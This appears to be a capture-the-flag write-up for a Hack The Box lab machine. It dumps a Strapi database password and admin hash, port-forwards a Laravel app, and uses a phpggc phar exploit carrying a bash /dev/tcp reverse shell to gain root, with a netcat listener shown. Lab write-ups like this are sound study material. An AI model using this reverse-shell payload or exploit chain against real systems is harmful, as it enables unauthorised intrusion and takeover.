Password in strapi config:
```json
strapi@horizontall:~/myapi/config/environments/development$ cat database.json   
{  
 "defaultConnection": "default",  
 "connections": {  
   "default": {  
     "connector": "strapi-hook-bookshelf",  
     "settings": {  
       "client": "mysql",  
       "database": "strapi",  
       "host": "127.0.0.1",  
       "port": 3306,  
       "username": "developer",  
       "password": "#J!:F9Zt2u"  
     },  
     "options": {}  
   }  
 }  
}
```

got password hash for admin user via dB enumeration:
```sql
mysql> use strapi;  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
mysql> show tables;  
+------------------------------+  
| Tables_in_strapi             |  
+------------------------------+  
| core_store                   |  
| reviews                      |  
| strapi_administrator         |  
| upload_file                  |  
| upload_file_morph            |  
| users-permissions_permission |  
| users-permissions_role       |  
| users-permissions_user       |  
+------------------------------+  
8 rows in set (0.00 sec)  
  
mysql> desc strapi_administrator;  
+--------------------+--------------+------+-----+---------+----------------+  
| Field              | Type         | Null | Key | Default | Extra          |  
+--------------------+--------------+------+-----+---------+----------------+  
| id                 | int(11)      | NO   | PRI | NULL    | auto_increment |  
| username           | varchar(255) | NO   | MUL | NULL    |                |  
| email              | varchar(255) | NO   |     | NULL    |                |  
| password           | varchar(255) | NO   |     | NULL    |                |  
| resetPasswordToken | varchar(255) | YES  |     | NULL    |                |  
| blocked            | tinyint(1)   | YES  |     | NULL    |                |  
+--------------------+--------------+------+-----+---------+----------------+  
6 rows in set (0.01 sec)  
  
mysql> SELECT * FROM strapi_administrator;  
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+  
| id | username | email                 | password                                                     | resetPasswordToken | blocked |  
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+  
|  3 | admin    | admin@horizontall.htb | $2a$10$umWTlDEy1SiVxWJhLxMHOO1LD2FxaIZBcIO1IsQO2tINaRRqv1o4O | NULL               |    NULL |  
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+  
1 row in set (0.00 sec)  
```
The hash does not crack

There is something listening on port 8000
```bash
strapi@horizontall:~$ netstat -tunlp |grep LIST  
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1835/node /usr/bin/   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -   
tcp6       0      0 :::80                   :::*                    LISTEN      -   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

portforward that with `ssh -L 8000:127.0.0.1:8000`, it is a laravel application
![[Pasted image 20210922225243.png]]

Its laravel v8, there is an [exploit](https://github.com/ambionics/laravel-exploits) for laravel <= v8.4.2
```bash
$ php -d'phar.readonly=0' phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system "bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" --fast-destruct 
$ ./laravel-exploit.py http://127.0.0.1:8000/ /tmp/exploit.phar
```

The SSH portforward keeps breaking for some reason, so edit the exploit and add the following line just after print("Successfully converted to phar!")
```python
os.system("ssh -i id_rsa strapi@10.10.11.105 -L 8000:127.0.0.1:8000")
```

and we get a shell
```bash
$ nc -nvlp 9001  
Listening on 0.0.0.0 9001  
Connection received on 10.10.11.105 40204  
bash: cannot set terminal process group (1836): Inappropriate ioctl for device  
bash: no job control in this shell  
root@horizontall:~#
```
